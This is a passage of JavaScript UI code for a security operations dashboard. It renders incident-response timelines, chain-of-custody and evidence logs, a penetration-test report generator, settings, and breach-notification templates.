            '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">' + esc(lang) + ' - ' + esc(cat) + '</span></div><div class="ag-panel-b">' +
            '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.65rem;color:var(--acc);overflow-x:auto;white-space:pre-wrap">' + esc(query) + '</pre></div></div>';
        };
      } else if (tab === 'playbooks') {
        hc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">HUNT PLAYBOOKS</span><span style="flex:1"></span><span style="color:var(--mut)">' + HUNT_PLAYBOOKS.length + ' playbooks</span></div>' +
            '<div class="ag-panel-b">' +
              HUNT_PLAYBOOKS.map(function(pb) {
                return '<details style="border-bottom:1px solid var(--line);padding:10px 0">' +
                  '<summary style="cursor:pointer;font-weight:700;font-size:.78rem;color:var(--txt)">' + esc(pb.name) + '</summary>' +
                  '<ol style="margin:8px 0 0;padding-left:20px">' +
                    pb.steps.map(function(step) {
                      return '<li style="font-size:.7rem;line-height:1.8;color:var(--mut)">' + esc(step) + '</li>';
                    }).join('') +
                  '</ol>' +
                '</details>';
              }).join('') +
            '</div>' +
          '</div>';
      } else if (tab === 'evidence') {
        hc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">EVIDENCE COLLECTION TIMELINE</span></div>' +
            '<div class="ag-panel-b">' +
              '<p style="font-size:.68rem;color:var(--mut);margin:0 0 10px">Log evidence collected during the hunt. Maintain chain of custody for forensic integrity.</p>' +
              '<div class="ag-grid3" style="margin-bottom:8px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Evidence Type</label>' +
                  '<select class="ag-sel" id="ag-evidtype" style="width:100%">' + EVIDENCE_TYPES.map(function(e) { return '<option>' + esc(e.type) + '</option>'; }).join('') + '</select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Source System</label><input class="ag-inp" id="ag-evidsrc" placeholder="e.g. DC-01, WEB-01"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Description</label><input class="ag-inp" id="ag-eviddesc" placeholder="What was collected"></div>' +
              '</div>' +
              '<button class="ag-btn" id="ag-evidadd">LOG EVIDENCE</button>' +
              '<div id="ag-evidlog" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>' +
          '<div class="ag-panel" style="margin-top:10px">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">EVIDENCE TYPE REFERENCE</span></div>' +
            '<div class="ag-panel-b">' +
              '<table class="ag-tbl"><thead><tr><th>Type</th><th>Format</th><th>Collection Tool</th><th>Notes</th></tr></thead><tbody>' +
              EVIDENCE_TYPES.map(function(e) {
                return '<tr><td style="font-weight:600;color:var(--acc)">' + esc(e.type) + '</td><td style="font-size:.65rem">' + esc(e.format) + '</td><td style="font-size:.65rem;color:var(--mut)">' + esc(e.tool) + '</td><td style="font-size:.62rem;color:var(--mut)">' + esc(e.notes) + '</td></tr>';
              }).join('') +
              '</tbody></table>' +
            '</div>' +
          '</div>';

        var evidenceLog = [];
        try { evidenceLog = JSON.parse(localStorage.getItem('aegis_evidence') || '[]'); } catch(_) {}
        function renderEvidLog() {
          var el = hc.querySelector('#ag-evidlog');
          if (evidenceLog.length === 0) {
            el.innerHTML = '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:16px">No evidence logged yet.</div>';
            return;
          }
          el.innerHTML =
            '<table class="ag-tbl"><thead><tr><th>#</th><th>Time</th><th>Type</th><th>Source</th><th>Description</th><th>Hash</th></tr></thead><tbody>' +
            evidenceLog.map(function(e, i) {
              return '<tr><td style="color:var(--acc)">' + (i+1) + '</td><td style="color:var(--mut);font-size:.62rem;white-space:nowrap">' + esc(e.time) + '</td><td style="font-weight:600;font-size:.65rem">' + esc(e.type) + '</td><td>' + esc(e.source) + '</td><td style="font-size:.65rem;color:var(--mut)">' + esc(e.desc) + '</td><td style="font-size:.55rem;color:var(--acc);font-family:inherit">' + esc(e.hash) + '</td></tr>';
            }).join('') +
            '</tbody></table>';
        }
        renderEvidLog();
        hc.querySelector('#ag-evidadd').onclick = function() {
          var type = hc.querySelector('#ag-evidtype').value;
          var source = hc.querySelector('#ag-evidsrc').value.trim();
          var desc = hc.querySelector('#ag-eviddesc').value.trim();
          if (!source || !desc) return;
          var hash = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(function(b){return b.toString(16).padStart(2,'0')}).join('');
          evidenceLog.push({ time: new Date().toISOString(), type: type, source: source, desc: desc, hash: hash });
          try { localStorage.setItem('aegis_evidence', JSON.stringify(evidenceLog)); } catch(_) {}
          if (mission) {
            mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'Evidence collected: ' + type + ' from ' + source });
            updateMission(mission);
          }
          renderEvidLog();
          hc.querySelector('#ag-evidsrc').value = '';
          hc.querySelector('#ag-eviddesc').value = '';
        };
      }
    }
    renderHuntContent(huntTab);
    c.querySelectorAll('[data-ht]').forEach(function(b) {
      b.onclick = function() {
        huntTab = b.dataset.ht;
        c.querySelectorAll('[data-ht]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.ht !== huntTab); });
        renderHuntContent(huntTab);
      };
    });
  }

  // ========== INCIDENT WAR ROOM ==========
  function renderWarRoom(c, mission) {
    var wrTab = 'timeline';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">' +
        ['timeline:Incident Timeline','containment:Containment','templates:Comm Templates','custody:Chain of Custody','review:Post-Incident'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (wrTab === p[0] ? '' : ' ag-btn-ghost') + '" data-wr="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-wrcontent"></div>';

    function renderWRContent(tab) {
      var wc = c.querySelector('#ag-wrcontent');
      if (tab === 'timeline') {
        var incidents = [];
        try { incidents = JSON.parse(localStorage.getItem('aegis_incidents') || '[]'); } catch(_) {}
        wc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:#ff1744">INCIDENT TIMELINE</span><span style="flex:1"></span><span style="color:var(--mut)">' + incidents.length + ' events</span></div>' +
            '<div class="ag-panel-b">' +
              '<div class="ag-grid3" style="margin-bottom:8px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Severity</label>' +
                  '<select class="ag-sel" id="ag-incsev" style="width:100%"><option>P1 - Critical</option><option>P2 - High</option><option>P3 - Medium</option><option>P4 - Low</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Event Type</label>' +
                  '<select class="ag-sel" id="ag-inctype" style="width:100%"><option>Detection</option><option>Triage</option><option>Containment</option><option>Eradication</option><option>Recovery</option><option>Escalation</option><option>Communication</option><option>Evidence</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Description</label><input class="ag-inp" id="ag-incdesc" placeholder="What happened..."></div>' +
              '</div>' +
              '<button class="ag-btn" id="ag-incadd">ADD EVENT</button>' +
              '<div id="ag-inclist" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        function renderIncList() {
          var el = wc.querySelector('#ag-inclist');
          if (incidents.length === 0) {
            el.innerHTML = '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:20px">No incident events recorded. Add the first event to start the timeline.</div>';
            return;
          }
          el.innerHTML = incidents.slice().reverse().map(function(inc) {
            var sevColor = inc.severity.indexOf('P1') >= 0 ? '#ff1744' : inc.severity.indexOf('P2') >= 0 ? '#ff9100' : inc.severity.indexOf('P3') >= 0 ? '#ffd600' : '#00e676';
            var typeColors = { Detection: '#ff1744', Triage: '#ff9100', Containment: '#ffd600', Eradication: '#2196f3', Recovery: '#00e676', Escalation: '#d500f9', Communication: '#00e5ff', Evidence: '#7c4dff' };
            return '<div style="display:flex;gap:12px;padding:8px 0;border-bottom:1px solid var(--line)">' +
              '<div style="min-width:80px;text-align:right">' +
                '<div style="font-size:.62rem;color:var(--mut)">' + esc(inc.time) + '</div>' +
              '</div>' +
              '<div style="width:3px;background:' + sevColor + ';border-radius:2px;flex-shrink:0"></div>' +
              '<div style="flex:1">' +
                '<div style="display:flex;align-items:center;gap:8px;margin-bottom:2px">' +
                  '<span class="ag-badge" style="background:' + (typeColors[inc.type] || 'var(--acc)') + '22;color:' + (typeColors[inc.type] || 'var(--acc)') + ';border:1px solid ' + (typeColors[inc.type] || 'var(--acc)') + '44;font-size:.5rem">' + esc(inc.type) + '</span>' +
                  '<span style="font-size:.62rem;color:' + sevColor + '">' + esc(inc.severity) + '</span>' +
                '</div>' +
                '<div style="font-size:.7rem;color:var(--txt)">' + esc(inc.desc) + '</div>' +
              '</div>' +
            '</div>';
          }).join('');
        }
        renderIncList();
        wc.querySelector('#ag-incadd').onclick = function() {
          var desc = wc.querySelector('#ag-incdesc').value.trim();
          if (!desc) return;
          incidents.push({
            time: new Date().toLocaleString(),
            severity: wc.querySelector('#ag-incsev').value,
            type: wc.querySelector('#ag-inctype').value,
            desc: desc
          });
          try { localStorage.setItem('aegis_incidents', JSON.stringify(incidents)); } catch(_) {}
          if (mission) {
            mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'Incident: ' + wc.querySelector('#ag-inctype').value + ' - ' + desc.substring(0, 50) });
            updateMission(mission);
          }
          wc.querySelector('#ag-incdesc').value = '';
          renderIncList();
        };
      } else if (tab === 'containment') {
        wc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">CONTAINMENT ACTION CHECKLIST</span></div>' +
            '<div class="ag-panel-b">' +
              '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.68rem;color:var(--txt);overflow-x:auto;white-space:pre-wrap;line-height:1.8">' + esc(WARROOM_TEMPLATES.containment_checklist) + '</pre>' +
            '</div>' +
          '</div>';
      } else if (tab === 'templates') {
        var tplNames = { executive_brief: 'Executive Briefing', technical_report: 'Technical Report', legal_notification: 'Legal/Regulatory Notification' };
        wc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">COMMUNICATION TEMPLATES</span></div>' +
            '<div class="ag-panel-b">' +
              '<div style="display:flex;gap:4px;margin-bottom:10px">' +
                Object.keys(tplNames).map(function(k) {
                  return '<button class="ag-btn ag-btn-ghost" data-wrtpl="' + k + '">' + tplNames[k] + '</button>';
                }).join('') +
              '</div>' +
              '<div id="ag-wrtplout"></div>' +
            '</div>' +
          '</div>';
        wc.querySelectorAll('[data-wrtpl]').forEach(function(b) {
          b.onclick = function() {
            wc.querySelector('#ag-wrtplout').innerHTML =
              '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.68rem;color:var(--txt);overflow-x:auto;white-space:pre-wrap;line-height:1.6">' + esc(WARROOM_TEMPLATES[b.dataset.wrtpl]) + '</pre>';
          };
        });
      } else if (tab === 'custody') {
        wc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">EVIDENCE CHAIN OF CUSTODY</span></div>' +
            '<div class="ag-panel-b">' +
              '<p style="font-size:.68rem;color:var(--mut);margin:0 0 10px">Track evidence handling to maintain forensic integrity. Each transfer or access must be documented.</p>' +
              '<div class="ag-grid2" style="margin-bottom:8px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Evidence ID</label><input class="ag-inp" id="ag-cocid" placeholder="EVID-001"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Action</label>' +
                  '<select class="ag-sel" id="ag-cocaction" style="width:100%"><option>Collected</option><option>Transferred</option><option>Analyzed</option><option>Stored</option><option>Released</option></select></div>' +
              '</div>' +
              '<div class="ag-grid2" style="margin-bottom:8px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Handler</label><input class="ag-inp" id="ag-cochandler" placeholder="Analyst name"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Notes</label><input class="ag-inp" id="ag-cocnotes" placeholder="Additional details"></div>' +
              '</div>' +
              '<button class="ag-btn" id="ag-cocadd">LOG CUSTODY EVENT</button>' +
              '<div id="ag-coclist" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        var cocLog = [];
        try { cocLog = JSON.parse(localStorage.getItem('aegis_coc') || '[]'); } catch(_) {}
        function renderCOC() {
          var el = wc.querySelector('#ag-coclist');
          if (cocLog.length === 0) {
            el.innerHTML = '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:16px">No custody events recorded.</div>';
            return;
          }
          el.innerHTML =
            '<table class="ag-tbl"><thead><tr><th>Time</th><th>Evidence ID</th><th>Action</th><th>Handler</th><th>Notes</th></tr></thead><tbody>' +
            cocLog.slice().reverse().map(function(e) {
              return '<tr><td style="color:var(--mut);font-size:.62rem;white-space:nowrap">' + esc(e.time) + '</td><td style="color:var(--acc);font-weight:600">' + esc(e.id) + '</td><td><span class="ag-badge ag-info" style="font-size:.5rem">' + esc(e.action) + '</span></td><td>' + esc(e.handler) + '</td><td style="font-size:.65rem;color:var(--mut)">' + esc(e.notes) + '</td></tr>';
            }).join('') +
            '</tbody></table>';
        }
        renderCOC();
        wc.querySelector('#ag-cocadd').onclick = function() {
          var id = wc.querySelector('#ag-cocid').value.trim();
          var handler = wc.querySelector('#ag-cochandler').value.trim();
          if (!id || !handler) return;
          cocLog.push({
            time: new Date().toISOString(),
            id: id,
            action: wc.querySelector('#ag-cocaction').value,
            handler: handler,
            notes: wc.querySelector('#ag-cocnotes').value.trim()
          });
          try { localStorage.setItem('aegis_coc', JSON.stringify(cocLog)); } catch(_) {}
          renderCOC();
        };
      } else if (tab === 'review') {
        wc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">POST-INCIDENT REVIEW GENERATOR</span></div>' +
            '<div class="ag-panel-b">' +
              '<div class="ag-grid2" style="gap:8px;margin-bottom:8px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Incident Title</label><input class="ag-inp" id="ag-pirtitle" placeholder="e.g. Ransomware Attack on Web Servers"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Incident Date</label><input class="ag-inp" id="ag-pirdate" type="date"></div>' +
              '</div>' +
              '<div class="ag-grid2" style="gap:8px;margin-bottom:8px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Root Cause</label><input class="ag-inp" id="ag-pirroot" placeholder="e.g. Unpatched Exchange server exploited via ProxyShell"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Impact</label><input class="ag-inp" id="ag-pirimpact" placeholder="e.g. 3 servers encrypted, 48hr downtime"></div>' +
              '</div>' +
              '<div style="margin-bottom:8px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Lessons Learned</label><textarea class="ag-textarea" id="ag-pirlessons" rows="3" placeholder="What went well? What could be improved?"></textarea></div>' +
              '<button class="ag-btn" id="ag-pirgen">GENERATE REVIEW</button>' +
              '<div id="ag-pirout" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        wc.querySelector('#ag-pirgen').onclick = function() {
          var title = wc.querySelector('#ag-pirtitle').value || 'Untitled Incident';
          var date = wc.querySelector('#ag-pirdate').value || new Date().toISOString().split('T')[0];
          var root = wc.querySelector('#ag-pirroot').value || 'Under investigation';
          var impact = wc.querySelector('#ag-pirimpact').value || 'Under assessment';
          var lessons = wc.querySelector('#ag-pirlessons').value || 'To be documented';
          var review = 'POST-INCIDENT REVIEW\n';
          review += '====================\n\n';
          review += 'Incident: ' + title + '\n';
          review += 'Date: ' + date + '\n';
          review += 'Review Date: ' + new Date().toISOString().split('T')[0] + '\n';
          review += 'Prepared By: ' + (settings.operator || 'Unknown') + ' (' + (settings.callsign || '') + ')\n\n';
          review += '1. INCIDENT SUMMARY\n';
          review += '   ' + title + '\n\n';
          review += '2. ROOT CAUSE ANALYSIS\n';
          review += '   ' + root + '\n\n';
          review += '3. IMPACT ASSESSMENT\n';
          review += '   ' + impact + '\n\n';
          review += '4. TIMELINE\n';
          if (mission) {
            (mission.actions || []).forEach(function(a) {
              review += '   [' + (a.time || '') + '] ' + (a.text || '') + '\n';
            });
          } else {
            review += '   (No mission timeline available)\n';
          }
          review += '\n5. LESSONS LEARNED\n';
          review += '   ' + lessons + '\n\n';
          review += '6. RECOMMENDATIONS\n';
          review += '   - Implement automated patching for critical systems\n';
          review += '   - Enhance monitoring and alerting capabilities\n';
          review += '   - Conduct regular tabletop exercises\n';
          review += '   - Review and update incident response procedures\n';
          review += '   - Implement network segmentation improvements\n';

          wc.querySelector('#ag-pirout').innerHTML =
            '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">POST-INCIDENT REVIEW</span></div><div class="ag-panel-b">' +
            '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.68rem;color:var(--txt);overflow-x:auto;white-space:pre-wrap;line-height:1.6">' + esc(review) + '</pre></div></div>';
        };
      }
    }
    renderWRContent(wrTab);
    c.querySelectorAll('[data-wr]').forEach(function(b) {
      b.onclick = function() {
        wrTab = b.dataset.wr;
        c.querySelectorAll('[data-wr]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.wr !== wrTab); });
        renderWRContent(wrTab);
      };
    });
  }

  // ========== REPORTING ==========
  function renderReporting(c, mission) {
    if (!mission) { c.innerHTML = '<div style="color:var(--mut);text-align:center;padding:40px;font-size:.8rem">Create a mission first.</div>'; return; }
    var findings = (mission.findings || []).sort(function(a,b){return b.cvss-a.cvss});
    var crit = findings.filter(function(f){return f.severity==='Critical'}).length;
    var high = findings.filter(function(f){return f.severity==='High'}).length;
    var med = findings.filter(function(f){return f.severity==='Medium'}).length;
    var low = findings.filter(function(f){return f.severity==='Low'}).length;
    var score = Math.max(0, 100 - crit * 20 - high * 10 - med * 5 - low * 2);

    var report = '=== AEGIS PENETRATION TEST REPORT ===\n';
    report += 'Classification: ' + (settings.classification || 'UNCLASSIFIED') + '\n';
    report += 'Generated: ' + new Date().toISOString() + '\n';
    report += 'Operator: ' + (settings.operator || 'Unknown') + ' (' + (settings.callsign || '') + ')\n\n';
    report += '--- EXECUTIVE SUMMARY ---\n';
    report += 'Mission: ' + mission.name + '\n';
    report += 'Target: ' + mission.target + '\n';
    report += 'Scope: ' + (mission.scope || 'Not defined') + '\n';
    report += 'Security Posture Score: ' + score + '/100\n';
    report += 'Total Findings: ' + findings.length + ' (Critical: ' + crit + ', High: ' + high + ', Medium: ' + med + ', Low: ' + low + ')\n\n';
    report += '--- RISK SUMMARY ---\n';
    report += 'Overall Risk Rating: ' + (crit > 0 ? 'CRITICAL' : high > 0 ? 'HIGH' : med > 0 ? 'MEDIUM' : 'LOW') + '\n';
    report += 'Exploitable Vulnerabilities: ' + findings.filter(function(f){return f.cvss >= 7}).length + '\n';
    report += 'Hosts Enumerated: ' + (mission.hosts || []).length + '\n';
    report += 'IOCs Identified: ' + (mission.iocs || []).length + '\n';
    report += 'Credentials Found: ' + (mission.credentials || []).length + '\n\n';
    report += '--- FINDINGS ---\n';
    findings.forEach(function(f, i) {
      report += '\n[' + (i+1) + '] ' + f.title + '\n';
      report += '    Severity: ' + f.severity + ' | CVSS: ' + (f.cvss || 'N/A') + '\n';
      report += '    Detail: ' + (f.detail || '') + '\n';
      report += '    Remediation: ' + (f.remediation || '') + '\n';
      if (f.mitre) report += '    MITRE ATT&CK: ' + f.mitre + '\n';
    });
    report += '\n--- HOSTS DISCOVERED ---\n';
    var uniqueHosts = {};
    (mission.hosts || []).forEach(function(h) {
      var key = h.ip + ':' + h.port;
      if (!uniqueHosts[key]) {
        uniqueHosts[key] = h;
        report += h.ip + ':' + h.port + ' (' + h.service + ' ' + h.version + ')\n';
      }
    });
    report += '\n--- IOC SUMMARY ---\n';
    var malicious = (mission.iocs || []).filter(function(i){return i.verdict === 'malicious'});
    if (malicious.length > 0) {
      report += 'Malicious indicators found: ' + malicious.length + '\n';
      malicious.forEach(function(i) { report += '  [' + i.type + '] ' + i.value + '\n'; });
    } else {
      report += 'No malicious indicators identified.\n';
    }
    report += '\n--- TIMELINE ---\n';
    (mission.actions || []).forEach(function(a) {
      report += '[' + (a.time || '') + '] ' + (a.text || '') + '\n';
    });
    report += '\n--- RECOMMENDATIONS ---\n';
    report += '1. Prioritize remediation of ' + crit + ' critical findings immediately\n';
    report += '2. Address ' + high + ' high-severity findings within 72 hours\n';
    report += '3. Schedule remediation of medium/low findings within 30 days\n';
    report += '4. Implement continuous monitoring for identified attack vectors\n';
    report += '5. Conduct follow-up assessment after remediation\n';
    report += '\n--- END REPORT ---\n';

    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">ENGAGEMENT REPORT</span><span style="flex:1"></span><button class="ag-btn" id="ag-rcopy" style="padding:3px 10px;font-size:.6rem">COPY TO CLIPBOARD</button></div>' +
        '<div class="ag-panel-b">' +
          '<div class="ag-grid4" style="margin-bottom:10px">' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (score >= 80 ? '#00e676' : score >= 50 ? '#ffd600' : '#ff1744') + '">' + score + '</div><div class="ag-stat-l">Posture Score</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff1744">' + crit + '</div><div class="ag-stat-l">Critical</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff9100">' + high + '</div><div class="ag-stat-l">High</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc)">' + findings.length + '</div><div class="ag-stat-l">Total Findings</div></div>' +
          '</div>' +
          '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.7rem;max-height:500px;overflow-y:auto;white-space:pre-wrap;line-height:1.6;color:var(--txt)">' + esc(report) + '</pre>' +
        '</div>' +
      '</div>';

    c.querySelector('#ag-rcopy').onclick = function() {
      navigator.clipboard.writeText(report).then(function() {
        c.querySelector('#ag-rcopy').textContent = 'COPIED';
        setTimeout(function() { c.querySelector('#ag-rcopy').textContent = 'COPY TO CLIPBOARD'; }, 1500);
      });
    };
  }

  // ========== SETTINGS ==========
  function renderSettings(c) {
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">OPERATOR SETTINGS</span></div>' +
        '<div class="ag-panel-b">' +
          '<div class="ag-grid2" style="gap:8px;margin-bottom:10px">' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Operator Name</label><input class="ag-inp" id="ag-sname" value="' + esc(settings.operator) + '"></div>' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Callsign</label><input class="ag-inp" id="ag-scallsign" value="' + esc(settings.callsign) + '"></div>' +
          '</div>' +
          '<div class="ag-grid2" style="gap:8px;margin-bottom:10px">' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Classification Level</label>' +
              '<select class="ag-sel" id="ag-scls" style="width:100%">' +
              ['UNCLASSIFIED','CUI','CONFIDENTIAL','SECRET','TOP SECRET'].map(function(l) {
                return '<option' + (settings.classification === l ? ' selected' : '') + '>' + l + '</option>';
              }).join('') +
              '</select></div>' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Theme</label>' +
              '<select class="ag-sel" id="ag-stheme" style="width:100%"><option>cyan</option><option>red</option><option>green</option></select></div>' +
          '</div>' +
          '<button class="ag-btn" id="ag-ssave">SAVE SETTINGS</button>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel" style="margin-top:10px">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">DATA MANAGEMENT</span></div>' +
        '<div class="ag-panel-b">' +
          '<div style="display:flex;gap:8px">' +
            '<button class="ag-btn ag-btn-ghost" id="ag-sexport">EXPORT ALL DATA</button>' +
            '<button class="ag-btn ag-btn-danger" id="ag-sclear">CLEAR ALL DATA</button>' +
          '</div>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel" style="margin-top:10px">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">SYSTEM STATUS</span></div>' +
        '<div class="ag-panel-b">' +
          '<div class="ag-grid4">' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#00e676;font-size:1rem">ONLINE</div><div class="ag-stat-l">System Status</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc);font-size:1rem">17</div><div class="ag-stat-l">Active Modules</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ffd600;font-size:1rem">' + CVE_DB.length + '</div><div class="ag-stat-l">CVE Entries</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#d500f9;font-size:1rem">' + APT_DB.length + '</div><div class="ag-stat-l">APT Groups</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff9100;font-size:1rem">' + SIGMA_TEMPLATES.length + '</div><div class="ag-stat-l">Sigma Rules</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#2196f3;font-size:1rem">' + SNORT_TEMPLATES.length + '</div><div class="ag-stat-l">Snort Rules</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#00e5ff;font-size:1rem">' + IR_PLAYBOOKS.length + '</div><div class="ag-stat-l">IR Playbooks</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff1744;font-size:1rem">' + Object.keys(MITRE_MATRIX).length + '</div><div class="ag-stat-l">MITRE Tactics</div></div>' +
          '</div>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel" style="margin-top:10px">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">ABOUT</span></div>' +
        '<div class="ag-panel-b" style="font-size:.72rem">' +
          '<div style="font-weight:700;color:var(--acc);margin-bottom:4px">AEGIS v2.0</div>' +
          '<div style="color:var(--mut)">Autonomous Electronic Governance & Intelligence System</div>' +
          '<div style="color:var(--mut);margin-top:4px">A government-level cyber operations platform built for Darknode.</div>' +
          '<div style="color:var(--mut);margin-top:4px">17 operational domains / 85+ modules / Offline-capable</div>' +
          '<div style="color:var(--mut);margin-top:4px">Includes: NOC, Exploit Lab, AD Planner, Cloud Attack Surface, Threat Hunting, Incident War Room</div>' +
          '<div style="color:var(--mut);margin-top:4px">Copyright 2026 Darknode-Official. All rights reserved.</div>' +
        '</div>' +
      '</div>';

    c.querySelector('#ag-ssave').onclick = function() {
      settings.operator = c.querySelector('#ag-sname').value;
      settings.callsign = c.querySelector('#ag-scallsign').value;
      settings.classification = c.querySelector('#ag-scls').value;
      settings.theme = c.querySelector('#ag-stheme').value;
      saveSettings(settings);
      render();
    };
    c.querySelector('#ag-sexport').onclick = function() {
      var data = JSON.stringify({ missions: loadMissions(), settings: settings }, null, 2);
      navigator.clipboard.writeText(data).then(function() { alert('Data copied to clipboard'); });
    };
    c.querySelector('#ag-sclear').onclick = function() {
      if (confirm('Delete ALL mission data? This cannot be undone.')) {
        localStorage.removeItem(STORE_KEY);
        localStorage.removeItem('aegis_active');
        localStorage.removeItem('aegis_evidence');
        localStorage.removeItem('aegis_incidents');
        localStorage.removeItem('aegis_coc');
        render();
      }
    };
  }

  // ========== COMMS LOG ==========
  function renderCommsLog(c, mission) {
    if (!mission) { c.innerHTML = '<div style="color:var(--mut);text-align:center;padding:40px;font-size:.8rem">Create a mission first.</div>'; return; }
    if (!mission.comms) mission.comms = [];
    var TEMPLATES = [
      {name: 'Executive Brief', text: 'SUBJECT: Security Incident Notification - [MISSION NAME]\n\nExecutive Summary:\nAt [TIME] on [DATE], our security team identified [INCIDENT TYPE] affecting [SYSTEMS/DATA].\n\nCurrent Status: [INVESTIGATING/CONTAINED/REMEDIATED]\n\nImpact Assessment:\n- Systems affected: [NUMBER]\n- Data at risk: [DESCRIPTION]\n- Business impact: [LOW/MEDIUM/HIGH/CRITICAL]\n\nActions Taken:\n1. [ACTION 1]\n2. [ACTION 2]\n3. [ACTION 3]\n\nNext Steps:\n- [STEP 1]\n- [STEP 2]\n\nETA for Resolution: [TIMEFRAME]\n\nPrepared by: [OPERATOR]'},
      {name: 'Customer Notification', text: 'Dear Valued Customer,\n\nWe are writing to inform you of a security incident that may affect your account.\n\nWhat happened: [DESCRIPTION]\nWhen it occurred: [DATE/TIME]\nWhat data may be affected: [DATA TYPES]\n\nWhat we are doing:\n- [ACTION 1]\n- [ACTION 2]\n\nWhat you should do:\n- Change your password immediately\n- Enable multi-factor authentication\n- Monitor your account for suspicious activity\n\nWe take the security of your data seriously and apologize for any inconvenience.\n\nContact: [SECURITY TEAM EMAIL]'},
      {name: 'Regulatory Notification', text: 'TO: [REGULATORY BODY]\nFROM: [ORGANIZATION]\nDATE: [DATE]\nRE: Data Breach Notification pursuant to [REGULATION]\n\nThis notification is provided in accordance with [GDPR Article 33 / HIPAA / State Breach Notification Law].\n\nNature of the breach: [DESCRIPTION]\nDate of discovery: [DATE]\nEstimated date of occurrence: [DATE]\nCategories of data affected: [PII/PHI/FINANCIAL/CREDENTIALS]\nApproximate number of individuals affected: [NUMBER]\n\nMeasures taken to address the breach:\n1. [ACTION 1]\n2. [ACTION 2]\n3. [ACTION 3]\n\nMeasures taken to mitigate adverse effects:\n1. [MITIGATION 1]\n2. [MITIGATION 2]\n\nData Protection Officer: [NAME] [EMAIL] [PHONE]'},
